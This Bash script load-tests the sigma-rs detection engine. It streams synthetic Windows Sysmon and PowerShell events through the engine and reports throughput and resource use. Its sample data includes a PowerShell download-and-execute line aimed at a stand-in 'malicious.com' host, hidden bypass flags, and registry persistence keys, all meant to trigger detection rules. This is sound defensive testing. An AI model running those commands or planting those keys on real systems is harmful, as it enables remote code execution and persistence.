#!/bin/bash
# Time-based load testing script for sigma-rs

# Colors for output
GREEN='\033[0;32m'
RED='\033[0;31m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

# Default values
DURATION=60  # seconds
RULES_DIR="./rules"
OUTPUT_DIR="./load_test_results"
TIMESTAMP=$(date +%Y%m%d_%H%M%S)
EVENT_RATE=0  # 0 means unlimited

# Parse arguments
while [[ $# -gt 0 ]]; do
    case $1 in
        --duration)
            DURATION="$2"
            shift 2
            ;;
        --rate)
            EVENT_RATE="$2"
            shift 2
            ;;
        --rules)
            RULES_DIR="$2"
            shift 2
            ;;
        --help|-h)
            echo "Usage: ./scripts/time_based_load_test.sh [OPTIONS]"
            echo ""
            echo "Options:"
            echo "  --duration <sec>  Test duration in seconds (default: 60)"
            echo "  --rate <eps>      Target events per second, 0=unlimited (default: 0)"
            echo "  --rules <dir>     Rules directory (default: ./rules)"
            echo "  --help            Show this help message"
            echo ""
            echo "Example:"
            echo "  ./scripts/time_based_load_test.sh --duration 300 --rate 10000"
            exit 0
            ;;
        *)
            echo "Unknown option: $1"
            exit 1
            ;;
    esac
done

# Create output directory
mkdir -p "$OUTPUT_DIR"

echo -e "${BLUE}=== Sigma-rs Time-Based Load Test ===${NC}"
echo -e "Duration: ${GREEN}${DURATION}s${NC}"
echo -e "Target Rate: ${GREEN}${EVENT_RATE} events/sec${NC} (0=unlimited)"
echo -e "Rules Directory: ${GREEN}$RULES_DIR${NC}"
echo ""

# Check if rules directory exists
if [ ! -d "$RULES_DIR" ]; then
    echo -e "${RED}Error: Rules directory not found: $RULES_DIR${NC}"
    exit 1
fi

# Count rules
RULE_COUNT=$(find "$RULES_DIR" -name "*.yml" -o -name "*.yaml" | wc -l | tr -d ' ')
echo -e "Rules loaded: ${GREEN}$RULE_COUNT${NC}"
echo ""

# Build sigma-rs in release mode
echo -e "${BLUE}Building sigma-rs in release mode...${NC}"
cargo build --release --no-default-features 2>/dev/null || {
    echo -e "${RED}Build failed!${NC}"
    exit 1
}

# Create Python event generator script
cat > "$OUTPUT_DIR/event_generator_${TIMESTAMP}.py" << 'EOF'
import json
import random
import uuid
import time
import sys
from datetime import datetime

def generate_event():
    """Generate a random event based on common Windows event types"""
    event_generators = [
        # Process creation (Sysmon Event ID 1)
        lambda: {
            "EventID": 1,
            "ProcessId": random.randint(1000, 10000),
            "Image": random.choice([
                "C:\\Windows\\System32\\cmd.exe",
                "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
                "C:\\Windows\\System32\\notepad.exe",
                "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe",
                "C:\\Windows\\System32\\svchost.exe",
                "C:\\Windows\\System32\\rundll32.exe",
                "C:\\Windows\\explorer.exe"
            ]),
            "CommandLine": random.choice([
                "cmd.exe /c whoami",
                "powershell.exe -encoded SGVsbG8gV29ybGQ=",
                "powershell.exe -exec bypass -nop -w hidden",
                "notepad.exe C:\\temp\\file.txt",
                "chrome.exe https://example.com",
                "rundll32.exe shell32.dll,Control_RunDLL",
                "svchost.exe -k netsvcs"
            ]),
            "User": random.choice(["NT AUTHORITY\\SYSTEM", "DOMAIN\\user1", "LOCAL\\admin", "DOMAIN\\svc_account"]),
            "ParentProcessId": random.randint(100, 1000),
            "ParentImage": random.choice([
                "C:\\Windows\\System32\\services.exe",
                "C:\\Windows\\System32\\winlogon.exe",
                "C:\\Windows\\explorer.exe"
            ]),
            "CPU": random.randint(0, 100),
            "Timestamp": datetime.utcnow().isoformat() + "Z"
        },
        
        # Network connection (Sysmon Event ID 3)
        lambda: {
            "EventID": 3,
            "ProcessId": random.randint(1000, 10000),
            "Image": random.choice([
                "C:\\Windows\\System32\\chrome.exe",
                "C:\\Windows\\System32\\svchost.exe",
                "C:\\Program Files\\MyApp\\app.exe"
            ]),
            "SourceIp": f"192.168.1.{random.randint(1, 254)}",
            "SourcePort": random.randint(49152, 65535),
            "DestinationIp": random.choice([
                f"10.0.0.{random.randint(1, 254)}",
                f"192.168.1.{random.randint(1, 254)}",
                f"172.16.0.{random.randint(1, 254)}",
                f"{random.randint(1, 223)}.{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(1, 254)}"
            ]),
            "DestinationPort": random.choice([80, 443, 22, 3389, 445, 135, 139, 8080]),
            "Protocol": "TCP",
            "Initiated": True,
            "Timestamp": datetime.utcnow().isoformat() + "Z"
        },
        
        # File creation (Sysmon Event ID 11)
        lambda: {
            "EventID": 11,
            "ProcessId": random.randint(1000, 10000),
            "Image": random.choice([
                "C:\\Windows\\System32\\powershell.exe",
                "C:\\Windows\\System32\\cmd.exe",
                "C:\\Program Files\\MyApp\\app.exe"
            ]),
            "TargetFilename": random.choice([
                f"C:\\Users\\user\\AppData\\Local\\Temp\\{uuid.uuid4().hex[:8]}.exe",
                f"C:\\Windows\\Temp\\tmp{random.randint(1000, 9999)}.dat",
                f"C:\\Users\\user\\Downloads\\document_{random.randint(1, 100)}.pdf",
                f"C:\\ProgramData\\{uuid.uuid4().hex[:8]}\\config.ini"
            ]),
            "CreationUtcTime": datetime.utcnow().isoformat() + "Z",
            "Timestamp": datetime.utcnow().isoformat() + "Z"
        },
        
        # Registry events (Sysmon Event ID 12, 13, 14)
        lambda: {
            "EventID": random.choice([12, 13, 14]),
            "ProcessId": random.randint(1000, 10000),
            "Image": random.choice([
                "C:\\Windows\\System32\\reg.exe",
                "C:\\Windows\\System32\\regedit.exe",
                "C:\\Windows\\System32\\powershell.exe"
            ]),
            "TargetObject": random.choice([
                "HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\Malware",
                "HKCU\\Software\\Classes\\ms-settings\\shell\\open\\command",
                "HKLM\\System\\CurrentControlSet\\Services\\MaliciousService",
                "HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\sethc.exe"
            ]),
            "Details": random.choice(["C:\\malware.exe", "1", "cmd.exe", "Binary Data"]),
            "Timestamp": datetime.utcnow().isoformat() + "Z"
        },
        
        # DNS Query (Sysmon Event ID 22)
        lambda: {
            "EventID": 22,
            "ProcessId": random.randint(1000, 10000),
            "QueryName": random.choice([
                "google.com",
                "microsoft.com",
                "update.microsoft.com",
                f"suspicious-{uuid.uuid4().hex[:8]}.com",
                "pastebin.com",
                f"{random.choice(['malware', 'c2', 'botnet', 'phishing'])}-{random.randint(1, 999)}.net"
            ]),
            "QueryStatus": 0,
            "QueryResults": f"{random.randint(1, 223)}.{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(1, 254)}",
            "Image": random.choice([
                "C:\\Windows\\System32\\chrome.exe",
                "C:\\Windows\\System32\\svchost.exe",
                "C:\\Program Files\\MyApp\\app.exe"
            ]),
            "Timestamp": datetime.utcnow().isoformat() + "Z"
        },
        
        # PowerShell events
        lambda: {
            "EventID": 4104,
            "ScriptBlockText": random.choice([
                "Get-Process | Where-Object {$_.CPU -gt 50}",
                "IEX (New-Object Net.WebClient).DownloadString('http://malicious.com/payload')",
                "$encoded = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes('malicious code'))",
                "Get-WmiObject -Class Win32_Process",
                "Invoke-Expression -Command 'suspicious command'"
            ]),
            "Path": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
            "Level": 4,
            "Timestamp": datetime.utcnow().isoformat() + "Z"
        }
    ]
    
    generator = random.choice(event_generators)
    return generator()

def main():
    duration = int(sys.argv[1])
    rate_limit = int(sys.argv[2]) if len(sys.argv) > 2 else 0
    
    start_time = time.time()
    event_count = 0
    
    while time.time() - start_time < duration:
        event = generate_event()
        print(json.dumps(event))
        event_count += 1
        
        # Rate limiting
        if rate_limit > 0:
            # Calculate how long we should have taken to generate this many events
            expected_time = event_count / rate_limit
            actual_time = time.time() - start_time
            if actual_time < expected_time:
                time.sleep(expected_time - actual_time)
    
    # Print stats to stderr
    total_time = time.time() - start_time
    print(f"Generated {event_count} events in {total_time:.2f} seconds", file=sys.stderr)
    print(f"Average rate: {event_count/total_time:.2f} events/second", file=sys.stderr)

if __name__ == "__main__":
    main()
EOF

# Start monitoring in background
STATS_FILE="$OUTPUT_DIR/stats_${TIMESTAMP}.txt"
MONITOR_PID=""

# Function to monitor sigma-rs process
monitor_process() {
    local sigma_pid=$1
    local start_time=$(date +%s)
    
    while kill -0 $sigma_pid 2>/dev/null; do
        # Get process stats
        if command -v ps >/dev/null 2>&1; then
            ps -p $sigma_pid -o pid,vsz,rss,pcpu,pmem,etime 2>/dev/null | tail -n +2 >> "$STATS_FILE"
        fi
        sleep 1
    done
}

# Run the time-based test
echo -e "${BLUE}Starting ${DURATION}-second load test...${NC}"
echo ""

# Progress bar setup
show_progress() {
    local duration=$1
    local elapsed=0
    local bar_length=50
    
    while [ $elapsed -lt $duration ]; do
        # Calculate progress
        local progress=$((elapsed * bar_length / duration))
        local remaining=$((bar_length - progress))
        
        # Build progress bar
        printf "\r["
        printf "%${progress}s" | tr ' ' '='
        printf "%${remaining}s" | tr ' ' '.'
        printf "] %d/%d seconds" $elapsed $duration
        
        sleep 1
        elapsed=$((elapsed + 1))
    done
    printf "\r["
    printf "%${bar_length}s" | tr ' ' '='
    printf "] %d/%d seconds\n" $duration $duration
}

# Start the test
START_TIME=$(date +%s.%N)
EVENT_COUNT_FILE="$OUTPUT_DIR/event_count_${TIMESTAMP}.txt"
MATCHES_FILE="$OUTPUT_DIR/matches_${TIMESTAMP}.txt"

# Run event generator and sigma-rs
(
    python3 "$OUTPUT_DIR/event_generator_${TIMESTAMP}.py" $DURATION $EVENT_RATE 2>"$EVENT_COUNT_FILE" | \
    ./target/release/sigma-rs --rules "$RULES_DIR" 2>&1 | \
    grep "rule_id" > "$MATCHES_FILE"
) &

TEST_PID=$!

# Get sigma-rs PID for monitoring
sleep 0.5
SIGMA_PID=$(pgrep -P $TEST_PID sigma-rs 2>/dev/null || echo "")

if [ -n "$SIGMA_PID" ]; then
    monitor_process $SIGMA_PID &
    MONITOR_PID=$!
fi

# Show progress
show_progress $DURATION

# Wait for test to complete
wait $TEST_PID
END_TIME=$(date +%s.%N)

# Kill monitor if still running
[ -n "$MONITOR_PID" ] && kill $MONITOR_PID 2>/dev/null

# Calculate results
TOTAL_DURATION=$(echo "$END_TIME - $START_TIME" | bc)
TOTAL_EVENTS=$(grep -o "Generated [0-9]* events" "$EVENT_COUNT_FILE" 2>/dev/null | awk '{print $2}' || echo "0")
TOTAL_MATCHES=$(wc -l < "$MATCHES_FILE" | tr -d ' ')
ACTUAL_RATE=$(grep -o "Average rate: [0-9.]* events/second" "$EVENT_COUNT_FILE" 2>/dev/null | awk '{print $3}' || echo "0")

# Get memory stats
if [ -f "$STATS_FILE" ] && [ -s "$STATS_FILE" ]; then
    MAX_RSS_KB=$(awk '{if ($3 > max) max = $3} END {print max}' "$STATS_FILE" 2>/dev/null || echo "0")
    MAX_RSS_MB=$(echo "scale=2; $MAX_RSS_KB / 1024" | bc 2>/dev/null || echo "0")
    AVG_CPU=$(awk '{sum += $4; count++} END {if (count > 0) print sum/count; else print 0}' "$STATS_FILE" 2>/dev/null || echo "0")
else
    MAX_RSS_MB="N/A"
    AVG_CPU="N/A"
fi

# Calculate throughput
if [ "$TOTAL_EVENTS" -gt 0 ] && [ "$TOTAL_DURATION" != "0" ]; then
    THROUGHPUT=$(echo "scale=2; $TOTAL_EVENTS / $TOTAL_DURATION" | bc)
else
    THROUGHPUT="0"
fi

echo ""
echo -e "${GREEN}=== Test Complete ===${NC}"
echo ""
echo -e "${BLUE}Results Summary:${NC}"
echo -e "├─ Duration: ${GREEN}${TOTAL_DURATION}s${NC}"
echo -e "├─ Total Events: ${GREEN}${TOTAL_EVENTS}${NC}"
echo -e "├─ Total Matches: ${GREEN}${TOTAL_MATCHES}${NC}"
echo -e "├─ Throughput: ${GREEN}${THROUGHPUT} events/sec${NC}"
echo -e "├─ Generator Rate: ${GREEN}${ACTUAL_RATE} events/sec${NC}"
echo -e "├─ Max Memory: ${GREEN}${MAX_RSS_MB} MB${NC}"
echo -e "└─ Avg CPU: ${GREEN}${AVG_CPU}%${NC}"

# Generate detailed report
REPORT_FILE="$OUTPUT_DIR/time_based_report_${TIMESTAMP}.txt"
cat > "$REPORT_FILE" << EOF
Sigma-rs Time-Based Load Test Report
===================================
Timestamp: $(date)
Duration: ${DURATION}s (actual: ${TOTAL_DURATION}s)
Rules: $RULE_COUNT

Performance Metrics:
- Total Events Generated: $TOTAL_EVENTS
- Total Matches Found: $TOTAL_MATCHES
- Match Rate: $(echo "scale=2; $TOTAL_MATCHES * 100 / $TOTAL_EVENTS" | bc 2>/dev/null || echo "0")%
- Throughput: $THROUGHPUT events/second
- Generator Rate: $ACTUAL_RATE events/second
- Max Memory (RSS): $MAX_RSS_MB MB
- Average CPU: $AVG_CPU%

System Information:
- CPU Cores: $(sysctl -n hw.ncpu 2>/dev/null || nproc 2>/dev/null || echo "N/A")
- Total Memory: $(sysctl -n hw.memsize 2>/dev/null | awk '{print $1/1024/1024/1024 " GB"}' || free -h 2>/dev/null | grep Mem | awk '{print $2}' || echo "N/A")
EOF

echo ""
echo -e "Detailed report saved to: ${BLUE}$REPORT_FILE${NC}"

# Cleanup
rm -f "$OUTPUT_DIR/event_generator_${TIMESTAMP}.py" 2>/dev/null

# Show sample matches if any
if [ "$TOTAL_MATCHES" -gt 0 ]; then
    echo ""
    echo -e "${YELLOW}Sample matches (first 3):${NC}"
    head -3 "$MATCHES_FILE" | jq -r '"\(.rule_title) (ID: \(.rule_id))"' 2>/dev/null || head -3 "$MATCHES_FILE"
fi